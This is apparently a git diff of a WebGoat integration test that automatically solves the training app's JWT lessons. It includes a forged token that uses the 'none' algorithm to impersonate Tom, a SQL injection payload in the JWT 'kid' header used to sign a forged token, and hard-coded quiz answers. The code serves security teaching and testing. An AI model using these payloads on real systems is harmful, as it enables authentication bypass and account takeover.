@@ -8,17 +8,20 @@ import java.time.Instant;
 import java.util.Base64;
 import java.util.Calendar;
 import java.util.Date;
+import java.util.HashMap;
+import java.util.Map;
 
 import org.hamcrest.CoreMatchers;
-import org.junit.Assert;
-import org.junit.Before;
-import org.junit.Test;
+import org.hamcrest.MatcherAssert;
+import org.junit.jupiter.api.Test;
 import org.owasp.webgoat.jwt.JWTSecretKeyEndpoint;
 
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.node.ObjectNode;
 
+import io.jsonwebtoken.Header;
+import io.jsonwebtoken.JwsHeader;
 import io.jsonwebtoken.Jwt;
 import io.jsonwebtoken.JwtException;
 import io.jsonwebtoken.Jwts;
@@ -27,22 +30,25 @@ import io.jsonwebtoken.impl.TextCodec;
 import io.restassured.RestAssured;
 
 public class JWTLessonTest extends IntegrationTest {
-
-	@Before
-	public void initTest() {
-		
-	}
 	
     @Test
     public void solveAssignment() throws IOException, InvalidKeyException, NoSuchAlgorithmException {
 
     	startLesson("JWT");
+
+    	decodingToken();
   
         resetVotes();
                 
         findPassword();
         
-        //        checkResults("/JWT/");
+        buyAsTom();
+        
+        deleteTom();
+
+		quiz();
+        
+        checkResults("/JWT/");
 
     }
     
@@ -71,6 +77,20 @@ public class JWTLessonTest extends IntegrationTest {
     	}
     	return null;
     }
+
+	private void decodingToken() {
+		MatcherAssert.assertThat(
+				RestAssured.given()
+						.when()
+						.relaxedHTTPSValidation()
+						.cookie("JSESSIONID", getWebGoatCookie())
+						.formParam("jwt-encode-user", "user")
+						.post(url("/WebGoat/JWT/decode"))
+						.then()
+						.statusCode(200)
+						.extract().path("lessonCompleted"), CoreMatchers.is(true));
+
+	}
     
     private void findPassword() throws IOException, NoSuchAlgorithmException, InvalidKeyException {
     	
@@ -84,7 +104,7 @@ public class JWTLessonTest extends IntegrationTest {
     	
     	String secret = getSecretToken(accessToken);
     	
-        Assert.assertThat(
+    	MatcherAssert.assertThat(
                 RestAssured.given()
                         .when()
                         .relaxedHTTPSValidation()
@@ -124,7 +144,7 @@ public class JWTLessonTest extends IntegrationTest {
         		.concat(new String(Base64.getUrlEncoder().encode(bodyObject.toString().getBytes())).toString())
         		.concat(".").replace("=", "");
         
-        Assert.assertThat(
+        MatcherAssert.assertThat(
                 RestAssured.given()
                         .when()
                         .relaxedHTTPSValidation()
@@ -135,5 +155,64 @@ public class JWTLessonTest extends IntegrationTest {
                         .statusCode(200)
                         .extract().path("lessonCompleted"), CoreMatchers.is(true));
     }
+    
+	private void buyAsTom() throws IOException {
+		
+		String header = new String(Base64.getUrlDecoder().decode("eyJhbGciOiJIUzUxMiJ9".getBytes(Charset.defaultCharset())));
+
+		String body = new String(Base64.getUrlDecoder().decode("eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0".getBytes(Charset.defaultCharset())));
+
+		body = body.replace("Jerry", "Tom");
+		
+		ObjectMapper mapper = new ObjectMapper();
+		JsonNode headerNode = mapper.readTree(header);
+		headerNode = ((ObjectNode) headerNode).put("alg", "NONE");
+
+		String replacedToken = new String(Base64.getUrlEncoder().encode(headerNode.toString().getBytes())).concat(".")
+				.concat(new String(Base64.getUrlEncoder().encode(body.getBytes())).toString())
+				.concat(".").replace("=", "");
+
+		MatcherAssert.assertThat(RestAssured.given()
+				.when().relaxedHTTPSValidation()
+				.cookie("JSESSIONID", getWebGoatCookie())
+				.header("Authorization","Bearer "+replacedToken)
+				.post(url("/WebGoat/JWT/refresh/checkout"))
+				.then().statusCode(200)
+				.extract().path("lessonCompleted"), CoreMatchers.is(true));
+	}
+	
+	private void deleteTom() {
+		
+		Map<String, Object> header = new HashMap();
+		  header.put(Header.TYPE, Header.JWT_TYPE);
+		  header.put(JwsHeader.KEY_ID, "hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --");
+		String token = Jwts.builder()
+				.setHeader(header)
+				.setIssuer("WebGoat Token Builder")
+				.setAudience("webgoat.org")
+				.setIssuedAt(Calendar.getInstance().getTime())
+				.setExpiration(Date.from(Instant.now().plusSeconds(60)))
+				.setSubject("tom@webgoat.org")
+				.claim("username", "Tom")
+				.claim("Email", "tom@webgoat.org")
+				.claim("Role", new String[] {"Manager", "Project Administrator"})
+				.signWith(SignatureAlgorithm.HS256, "deletingTom").compact();
+		
+		MatcherAssert.assertThat(RestAssured.given()
+				.when().relaxedHTTPSValidation()
+				.cookie("JSESSIONID", getWebGoatCookie())
+				.post(url("/WebGoat/JWT/final/delete?token="+token))
+				.then()
+				.statusCode(200)
+				.extract().path("lessonCompleted"), CoreMatchers.is(true));
+	}
+
+	private void quiz() { 
+		Map<String, Object> params = new HashMap<>();
+		params.put("question_0_solution", "Solution 1");
+		params.put("question_1_solution", "Solution 2");
+
+		checkAssignment(url("/WebGoat/JWT/quiz"), params, true);
+	}
     
 }
